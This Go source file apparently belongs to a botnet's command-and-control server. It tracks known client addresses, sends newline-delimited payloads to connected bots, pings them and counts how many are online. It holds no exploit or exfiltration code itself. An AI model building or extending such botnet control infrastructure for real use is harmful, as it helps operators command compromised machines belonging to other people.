// This file handles client connections to the server

package net

import (
	. "botnet/server/util"
	"net"
	"strings"
)

var Connections map[string]*net.Conn // The value is nil if the client is not currently connected, but has connected before.

func getKnownAddresses() {
	knownAddressesRaw := ReadFile(KnownAddressesPath, true)
	knownAddresses := strings.Split(*knownAddressesRaw, "\n")
	
	for _, addr := range knownAddresses {
		if addr == "" { continue }
		Connections[addr] = nil
	}
}

func init() {
	Connections = make(map[string]*net.Conn)
	getKnownAddresses()
}

func Write(conn net.Conn, payload string) error {
	_, err := conn.Write([]byte(payload + "\n")) // The \n is appended as it is used as a delimiter by the client.
	if err != nil {
		Connections[RemovePort(conn.RemoteAddr().String())] = nil
	}

	return err
}

func PingConnection(conn net.Conn) error {
	err := Write(conn, "ping")
	return err
}

func OnlineConnectionCount() int {
	count := 0

	for _, conn := range Connections {
		if conn == nil { continue }

		err := PingConnection(*conn)
		if err != nil {
			*conn = nil
			continue
		}

		count += 1
	}

	return count
}